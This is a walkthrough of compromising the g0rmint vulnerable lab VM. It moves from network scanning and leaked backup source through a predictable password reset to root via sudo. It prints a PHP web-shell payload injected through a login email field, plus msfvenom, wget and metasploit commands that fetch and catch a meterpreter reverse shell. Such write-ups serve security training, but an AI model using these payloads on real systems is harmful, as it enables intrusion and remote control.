# g04mint

First off, find the box:

```bash
netdiscover -r 192.168.171.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts

```

Scan with nmap:

```bash
nmap -T4 -A -oA g0rmint  192.168.171.138
```

Looks like 22 and 80 are open, not a lot to go on...

Accessing the server on port 80 returns a 404 page, better try for a robots.txt and find this:

/* Too easy? Lets see */
Disallow: /g0rmint/*

Now I'm faced with a login page and nothing to go on, however the following showed up in the login page's markup:

```html
<meta name="backup-directory" content="s3cretbackupdirect0ry">
```

Next run dirb to try and find hidden content, nothing really popped up.

I tried fuzzing a bunch of mobile user agents to see if this meta tag somehow triggers a different page response as well as brute forcing the login/reset forms, nothing seemed to be working.

Then I remembered I need to try force browsing that directory now that new file system elements exist:

```bash

dirb http://192.168.171,138/g0rmint/s3crebackupdirect0ry -i -l

```

This found an info.php file which shows backup.zip, lets download that and take a look

A few interesting things here, first the config file has a function for writing PHP files out to the server, and the login page calls this storing the email form field in the generated PHP.

```php

function addlog($log, $reason) {
    $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
    if (file_exists($myFile)) {
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\n");
    } else {
        $fh = fopen($myFile, 'w');
        fwrite($fh, file_get_contents("dummy.php") . "<br>\n");
        fclose($fh);
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\n");
    }
    fclose($fh);
}

```

Next looking at the register page if we know a legit user/email combination the user's password will be reset to the first 20 characters of a sha1 hash of the current date/time in GMT, which luckily gets printed to the page each time you reload or submit a postback.


After a lot of banging my head I finally learned a vital piece I'm usually missing during enumeration, in this case we need an email.  What I'm finally learning is I should be searching better any time I have a known input, in this case the email can be searched for in all this source code:

```bash

grep -i -r -E -o "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b" *
Binary file backup.zip matches

js/jquery.elfinder.min.js:strogg@yandex.ru

```

Now to review all the files, style.css seems like a good starting point, thats usually the place an author or developer would put their CSS for a site/app.

```css

/*
* Author: noman
* Author Email: w3bdrill3r@gmail.com
* Version: 1.0.0
* g0rmint: Bik gai hai
* Copyright: Aunty g0rmint
* www: http://g0rmint.com
* Site managed and developed by author himself
*/

```

Right in plain site, it even states the manager/developer/admin as this person.

Now to get our password, time to generate our hash:

```php

substr(hash('sha1', 'date time string from the page load'), 0, 20);

```

and we have our password.

With the amount of time that elapsed getting this far I had completely forgotten about the addslashes call in config.php which lead to me wasting hours trying to get decent code execution going.  Once I reviewed the code again getting execution was pretty straightforward:

```php

<?php echo shell_exec(base64decode($_GET[cmd])); ?> 

```

as our email and we can start sending commands.

Now to generate a wget command to pull down a reverse_tcp shell:

```bash

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.171.136 LPORT=4444 R > shell.php
echo 'wget http://192.168.171.36:8000/shell.php' | base64
d2dldCBodHRwOi8vMTkyLjE2OC4xNzEuMzY6ODAwMC9zaGVsbC5waHAK==
python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.171.138 - - [17/Jan/2018 22:32:39] "GET /shell.php HTTP/1.1" 200 -
```

Now to setup metasploit to handle the callback:

```bash

screen -S msf msfconsole

msf > use exploit/multi/handler
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.171.136
LHOST => 192.168.171.136
msf exploit(handler) > set LPORT 4444
LPORT => 4444

set PAYLOAD php/meterpreter/reverse_tcp

```

Then request our webshell, and we have a meterpreter session running.

Once connected I grabbed and ran LinEnum from rebootuser in hopes of finding something juicy.  Once I had the output I started parsing through and searched for vulns in the kernel, mysql, apache. logs, binaries, etc. and having nothing work.  Then took a look around and saw another backup.zip, extract and get this difference:

```sql
INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
(1, 'noman', 'w3bdrill3r@gmail.com', 'ea60b43e48f3c2de55e4fc89b3da53dc');
```

Then crack the hash and get: tayyab123

Now to try ssh with the g0rmint user in /etc/passwd and get a login, run sudo -l:

```bash
g0rmint@ubuntu:~$ sudo -l
[sudo] password for g0rmint:
Matching Defaults entries for g0rmint on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User g0rmint may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Looks like we're done: 

```bash

g0rmint@ubuntu:~$ sudo su
root@ubuntu:/home/g0rmint# ls /root
flag.txt
root@ubuntu:/home/g0rmint# cat /root/flag.txt
Congrats you did it :)
Give me feedback @nomanriffat
root@ubuntu:/home/g0rmint#

```
